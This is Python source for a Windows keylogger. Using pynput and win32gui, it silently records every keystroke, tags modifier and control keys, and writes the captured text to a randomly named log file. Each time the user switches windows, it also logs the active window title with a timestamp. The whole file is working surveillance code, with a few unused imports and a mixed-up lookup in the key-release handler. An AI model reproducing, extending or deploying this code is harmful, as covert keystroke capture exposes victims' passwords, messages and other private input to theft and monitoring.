import pynput
import base64
import random
import string
import datetime
import threading
import os
from pynput import keyboard
from win32gui import GetWindowText, GetForegroundWindow


# generate a random filename for our log file
fname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + ".txt"


def log():
    # print statements for when mods are used
    mods = {
        "Key.space": " {sp} ",
        "Key.menu": " {menu} ",
        "Key.tab": " {tab} ",
        "Key.esc": " {esc} ",
        "Key.backspace": " {bsp} ",
        "Key.enter": " {ent} ",
        "Key.caps_lock": " {cLok} ",
        "Key.delete": " {del} ",
        "Key.ctrl_l": " {lctrl} ",
        "Key.ctrl_r": " {rctrl} ",
        "Key.alt_l": " {lalt}",
        "Key.alt_r": " {ralt}",
        "Key.shift": " {sft} ",
        "Key.cmd": " {cmd} ",
        # control characters
        "\\x01": " {^a} ",
        "\\x02": " {^b} ",
        "\\x03": " {^c} ",
        "\\x04": " {^d} ",
        "\\x05": " {^e} ",
        "\\x06": " {^f} ",
        "\\x07": " {^g} ",
        "\\x08": " {^h} ",
        "\\x09": " {^i} ",
        "\\x0A": " {^j} ",
        "\\x0B": " {^k} ",
        "\\x0C": " {^l} ",
        "\\x0D": " {^m} ",
        "\\x0E": " {^n} ",
        "\\x0F": " {^o} ",
        "\\x10": " {^p} ",
        "\\x11": " {^q} ",
        "\\x12": " {^r} ",
        "\\x13": " {^s} ",
        "\\x14": " {^t} ",
        "\\x15": " {^u} ",
        "\\x16": " {^v} ",
        "\\x17": " {^w} ",
        "\\x18": " {^x} ",
        "\\x19": " {^y} ",
        "\\x1A": " {^z} ",
    }
    # print statements for when mods are released
    mods_r = {
        "Key.delete": " {del_r} ",
        "Key.ctrl_l": " {lctrl_r} ",
        "Key.ctrl_r": " {rctrl_r} ",
        "Key.shift": " {sft_r} ",
        "Key.alt": " {alt_r} ",
        "Key.alt_l": " {lalt_r}",
        "Key.alt_r": " {ralt_r}",
        "Key.alt_gr": " {altgr_r} ",
        "Key.cmd": " {cmd_r} ",
    }

    def on_press(key):
        global currentwindow
        checkwindow = (GetWindowText(GetForegroundWindow()))
        if currentwindow != checkwindow:
            now = datetime.datetime.now()
            now_f = now.strftime("%Y-%m-%d %H:%M:%S")
            with open(fname, "a+") as f:
                f.write("\n\n")
                f.write(f"### Window Changed to \"{checkwindow}\" @ {now_f} ###")
                f.write("\n")
            currentwindow = checkwindow
        kl = []
        ks = str(key).strip("'")
        kl.append(ks)
        log_file(kl)
        kl = []

    def on_release(key):
        onreleasekeys = ["Key.cmd", "Key.ctrl_l", "Key.ctrl_r", "Key.alt_gr", "Key.alt", "Key.delete"]
        klr = []
        ksr = str(key).strip("'")
        klr.append(ksr)
        log_file_release(klr)
        klr = []

    def log_file_release(klr):
        with open(fname, "a+") as f:
            for key in klr:
                if key in mods_r:
                    f.write(str(mods.get(key)))
                else:
                    continue

    def log_file(kl):
        with open(fname, "a+") as f:
            for key in kl:
                if key in mods:
                    f.write(str(mods.get(key)))
                else:
                    f.write(key)

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()


currentwindow = (GetWindowText(GetForegroundWindow()))

log()
